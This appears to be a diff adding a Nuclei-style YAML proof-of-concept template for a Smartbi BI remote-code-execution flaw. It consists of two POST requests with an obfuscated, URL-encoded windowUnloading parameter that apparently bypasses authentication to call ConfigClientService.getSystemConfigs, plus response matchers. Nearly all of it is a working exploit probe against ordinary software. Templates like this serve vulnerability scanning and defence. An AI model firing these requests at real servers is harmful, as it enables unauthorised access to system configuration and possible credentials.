@@ -1,0 +1,39 @@
+id: yaml-poc-smartbi-smartbi_bi-rce-CT-778385
+info:
+  name: Yaml Poc Smartbi Smartbi_Bi Rce Ct 778385
+  author: jiahao.sun
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-smartbi-smartbi_bi-rce-CT-778385'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /{{value}}?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+  body: 'className=ConfigClientService&methodName=getSystemConfigs&params=[]
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - (sB(3x)sflQlD)6fxA3MhkfhD)6
+    - '# 公共设置'
+- method: POST
+  path:
+  - /{{value}}?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+  body: 'className=ConfigClientService&methodName=getSystemConfigs&params=[]
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - (sB(3x)sflQlD)6fxA3MhkfhD)6
+    - '# 公共设置'
